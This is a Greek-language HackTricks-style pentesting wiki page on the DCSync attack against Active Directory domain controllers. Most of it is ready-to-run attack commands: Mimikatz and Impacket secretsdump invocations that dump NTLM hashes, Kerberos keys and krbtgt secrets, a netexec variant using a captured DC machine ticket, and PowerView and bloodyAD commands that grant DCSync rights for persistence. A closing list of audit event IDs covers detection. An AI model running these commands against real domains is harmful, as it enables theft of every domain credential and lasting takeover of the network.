# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Το permission **DCSync** συνεπάγεται την ύπαρξη των εξής permissions στο ίδιο το domain: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** και **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Σημαντικές σημειώσεις για το DCSync:**

- Το **DCSync attack προσομοιώνει τη συμπεριφορά ενός Domain Controller και ζητά από άλλους Domain Controllers να αναπαράγουν πληροφορίες** χρησιμοποιώντας το Directory Replication Service Remote Protocol (MS-DRSR). Επειδή το MS-DRSR είναι μια έγκυρη και απαραίτητη λειτουργία του Active Directory, δεν μπορεί να απενεργοποιηθεί.
- Από προεπιλογή, μόνο οι ομάδες **Domain Admins, Enterprise Admins, Administrators και Domain Controllers** διαθέτουν τα απαιτούμενα προνόμια.
- Στην πράξη, το **full DCSync** απαιτεί τα **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** στο domain naming context. Το `DS-Replication-Get-Changes-In-Filtered-Set` συνήθως ανατίθεται μαζί τους, αλλά από μόνο του αφορά περισσότερο τον συγχρονισμό **εμπιστευτικών attributes / attributes που φιλτράρονται από RODC** (για παράδειγμα, μυστικών τύπου legacy LAPS) παρά ένα πλήρες dump του krbtgt.<sup>[[2]](#references)</sup>
- Αν οι κωδικοί πρόσβασης κάποιων λογαριασμών αποθηκεύονται με αναστρέψιμη κρυπτογράφηση, το Mimikatz διαθέτει μια επιλογή που επιστρέφει τον κωδικό πρόσβασης σε μορφή απλού κειμένου

### Απαρίθμηση

Ελέγξτε ποιος έχει αυτά τα permissions χρησιμοποιώντας το `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Αν θέλετε να εστιάσετε σε **μη προεπιλεγμένες οντότητες** με δικαιώματα DCSync, εξαιρέστε τις ενσωματωμένες ομάδες με δυνατότητα replication και εξετάστε μόνο τους μη αναμενόμενους αποδέκτες δικαιωμάτων:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Exploit τοπικά

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Exploit εξ αποστάσεως

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Πρακτικά παραδείγματα περιορισμένου πεδίου:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync με χρήση captured DC machine TGT (ccache)

Κατά την εξέταση μιας υπηρεσίας σε έναν domain controller, ξεχωρίστε την τοπική ταυτότητα της υπηρεσίας από την ταυτότητα δικτύου της. Η [Microsoft τεκμηριώνει](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) ότι οι virtual accounts του SQL Server (`NT SERVICE\...`) αποκτούν πρόσβαση σε πόρους δικτύου ως ο λογαριασμός υπολογιστή του host. Σε έναν domain controller, αυτό μπορεί να καταστήσει τον λογαριασμό υπολογιστή του DC σχετικό με τον έλεγχο των replication rights, αλλά ένα foothold σε υπηρεσία από μόνο του δεν αποδεικνύει ότι υπάρχει εξαγώγιμο machine TGT ή διαθέσιμος έλεγχος ταυτότητας για DCSync. Επαληθεύστε την πραγματική ταυτότητα της υπηρεσίας, το πλαίσιο εξερχόμενου ελέγχου ταυτότητας, τα διαθέσιμα tickets ή credentials και τα ισχύοντα replication rights πριν θεωρήσετε ότι πρόκειται για πιθανή διαδρομή.

Σε σενάρια unconstrained-delegation export-mode, μπορεί να γίνει capture ενός machine TGT του Domain Controller (π.χ., `DC1$@DOMAIN` για `krbtgt@DOMAIN`). Έπειτα μπορείτε να χρησιμοποιήσετε αυτό το ccache για να κάνετε authenticate ως DC και να εκτελέσετε DCSync χωρίς password.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Operational notes:

- **Το Kerberos path του Impacket αγγίζει πρώτα το SMB** πριν από την κλήση DRSUAPI. Αν το περιβάλλον επιβάλλει **SPN target name validation**, ένα full dump μπορεί να αποτύχει με το μήνυμα `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Σε αυτή την περίπτωση, είτε ζητήστε πρώτα ένα service ticket **`cifs/<dc>`** για τον DC-στόχο είτε χρησιμοποιήστε το **`-just-dc-user`** για τον λογαριασμό που χρειάζεστε άμεσα.
- Όταν έχετε μόνο χαμηλότερα replication rights, ο συγχρονισμός τύπου LDAP/DirSync μπορεί και πάλι να εκθέσει **confidential** ή **RODC-filtered** attributes (για παράδειγμα το παλιό `ms-Mcs-AdmPwd`) χωρίς πλήρες krbtgt replication.<sup>[[2]](#references)</sup>

Το `-just-dc` δημιουργεί 3 αρχεία:

- ένα με τα **NTLM hashes**
- ένα με τα **Kerberos keys**
- ένα με cleartext passwords από το NTDS για τυχόν λογαριασμούς στους οποίους είναι ενεργοποιημένη η [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Μπορείτε να βρείτε χρήστες με reversible encryption χρησιμοποιώντας το εξής:

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistence

Αν είστε διαχειριστής domain, μπορείτε να εκχωρήσετε αυτά τα δικαιώματα σε οποιονδήποτε χρήστη με τη βοήθεια του PowerView:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Οι χειριστές Linux μπορούν να κάνουν το ίδιο με το `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Έπειτα, μπορείτε να **ελέγξετε αν έχουν εκχωρηθεί σωστά στον χρήστη** τα 3 προνόμια, αναζητώντας τα στην έξοδο του (θα πρέπει να μπορείτε να δείτε τα ονόματα των προνομίων μέσα στο πεδίο "ObjectType"):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Μετριασμός

- Security Event ID 4662 (Πρέπει να είναι ενεργοποιημένη η Πολιτική ελέγχου για το αντικείμενο) – Εκτελέστηκε μια λειτουργία σε ένα αντικείμενο<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Πρέπει να είναι ενεργοποιημένη η Πολιτική ελέγχου για το αντικείμενο) – Τροποποιήθηκε ένα αντικείμενο υπηρεσίας καταλόγου
- Security Event ID 4670 (Πρέπει να είναι ενεργοποιημένη η Πολιτική ελέγχου για το αντικείμενο) – Άλλαξαν τα δικαιώματα σε ένα αντικείμενο
- AD ACL Scanner - Δημιουργήστε και συγκρίνετε αναφορές ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Αξιοποίηση των Replication Get-Changes και Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Εξαγωγή password hashes από Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — Διαπιστευτήρια SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync για DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
